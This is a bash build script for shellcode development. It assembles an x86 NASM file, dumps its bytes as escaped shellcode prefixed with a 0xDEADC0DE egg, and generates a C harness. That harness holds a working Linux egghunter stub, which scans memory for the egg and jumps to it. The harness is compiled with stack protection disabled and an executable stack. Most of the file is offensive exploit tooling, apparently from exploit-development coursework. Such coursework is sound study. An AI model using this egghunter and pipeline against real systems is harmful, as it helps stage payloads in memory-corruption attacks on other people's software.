#!/bin/bash

FILENAME=$(basename $1 .asm)
EGG="\"\\xDE\\xAD\\xC0\\xDE\""

echo "[+] - [1/5] - Assembling $1 with nasm ..."
nasm -f elf32 -o $FILENAME.o $FILENAME.asm
if [ "$?" -ne "0" ]; then
	exit $?
fi

echo "[+] - [2/5] - Linking ..."
ld -melf_i386 -o $FILENAME $FILENAME.o
EXIT=$?
rm -rf $FILENAME.o
if [ "$EXIT" -ne "0" ]; then
	exit $EXIT
fi

echo "[+] - [3/5] - Generating ${FILENAME}.shell ..."

(echo $EGG; echo $EGG; objdump -d $FILENAME | grep -E '^ [0-9a-f]*:' | cut -f 2 | paste -s -d' ' | sed -E 's/\ +/ /g; s/\ $//g; s/\ /\\x/g; s/^/\\x/g;' | sed -E 's/(.{80})/\1\n/g' | sed -E 's/^/"/g; s/$/"/g') > ${FILENAME}.shell

if [ "$?" -ne "0" ]; then
	exit $?
fi

rm -rf $FILENAME

echo "[+] - [4/5] - Creating ${FILENAME}.c for testing ..."

SHELL_OUT="${FILENAME}_shell"

cat > $FILENAME.c <<EOF
#include <stdio.h>
#include <string.h>

#define EGG ${EGG}

unsigned char code[] = 
#include "${FILENAME}.shell"
;

unsigned char egghunter[] = 
"\x31\xdb\x66\x81\xcb\xff\x0f\x43\x31\xc0\xb0\xba\xcd\x80\x3c\xf2\x74\xf0\xb8"
EGG
"\x89\xdf\xaf\x75\xeb\xaf\x75\xe8\xff\xe7";

typedef int (*shellfunc_t)();

int main(int argc, char *argv[])
{
	printf("Egg Length: %d\\n", (int)strlen(code));
	printf("Egghunter Length: %d\\n", (int)strlen(egghunter));

	shellfunc_t ret = (shellfunc_t)egghunter;

	ret();

	return 0;
}
EOF

echo "[+] - [5/5] - Compiling ${FILENAME}.c ..."

gcc -m32 -fno-stack-protector -z execstack -o $SHELL_OUT ${FILENAME}.c

rm -rf ${FILENAME}.c

echo "[+] - Done"
